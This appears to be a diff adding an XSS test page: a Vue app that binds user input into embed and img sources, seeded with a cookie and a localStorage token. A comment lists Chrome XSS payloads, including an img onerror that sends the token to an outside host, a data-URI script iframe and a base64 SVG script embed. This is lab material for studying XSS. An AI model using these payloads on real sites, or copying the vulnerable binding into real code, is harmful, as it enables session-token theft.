@@ -1,0 +1,47 @@
+<?php 
+   header("Set-Cookie: token=thisishttponlytoken; httpOnly");
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>XSS test</title>
+	<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+</head>
+<body>
+
+		this is a VUE app
+		<div id="app">
+			<div>{{message}}</div>
+		  <embed v-bind:src="message"> </embed> 
+		  <img v-bind:src="message"/>
+		  <input v-model="message">
+		</div>
+
+
+	<script type="text/javascript">
+
+		var app = new Vue({
+		  el: '#app',
+		  data: {
+		    message: "http://baidu.com"
+		  }
+		})
+
+		localStorage.setItem("token","thisistoken");
+	</script>
+
+
+<!-- 
+		XSS payload for chrome:
+		
+		<img/src=x onerror="(new Image()).src = 'http://printf.cn?token='+ localStorage.getItem('token')">
+
+		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+		<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"></embed> 
+
+
+ -->
+</body>
+</html>
